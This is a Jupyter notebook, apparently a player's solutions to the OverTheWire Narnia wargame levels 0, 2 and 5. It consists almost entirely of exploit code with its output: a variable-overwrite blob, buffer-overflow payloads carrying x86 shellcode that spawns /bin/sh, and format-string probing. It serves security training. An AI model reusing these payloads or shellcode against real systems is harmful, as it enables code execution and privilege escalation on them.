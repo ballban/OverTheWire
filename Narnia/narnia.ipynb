{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## narnia0\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "import struct\n",
    "\n",
    "with open(\"injection123.blob\", \"wb\") as f:\n",
    "    f.write(b\"0\" * 20 + struct.pack(\"<I\", 0xDEADBEEF))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## narnia2\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj1X\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1jFX\\xcd\\x80\\xb0\\x0bRhn/shh//bi\\x89\\xe3\\x89\\xd1\\xcd\\x80'\n"
     ]
    }
   ],
   "source": [
    "print(\n",
    "    b\"\\x41\" * 130\n",
    "    + b\"\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\"\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## narnia5\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"%x\" * 64\n",
    "\n",
    "for i in range(64):\n",
    "    print(f\"%{i}$x\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\xa6\\xd5\\xff\\xff'\n",
      "b'\\x8a\\xd5\\xff\\xff'\n",
      "b'\\x97O\\xfc\\xf7'\n",
      "b'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x8a\\xd5\\xff\\xff\\x97O\\xfc\\xf7\\x97O\\xfc\\xf7j1X\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1jFX\\xcd\\x80\\xb0\\x0bRhn/shh//bi\\x89\\xe3\\x89\\xd1\\xcd\\x80'\n"
     ]
    }
   ],
   "source": [
    "padding = b\"\\x90\" * 20\n",
    "blah = struct.pack(\"<I\", 0xFFFFD58A)\n",
    "target = struct.pack(\"<I\", 0xFFFFD58A + len(padding) + len(blah) * 2)\n",
    "print(target)\n",
    "target = struct.pack(\"<I\", 0xF7FC4F97)\n",
    "shellcode = b\"\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\"\n",
    "\n",
    "payload = padding + blah + target * 2 + shellcode\n",
    "print(blah)\n",
    "print(target)\n",
    "print(payload)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "594"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0xFFFFD5A6 - 0xFFFFD354"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
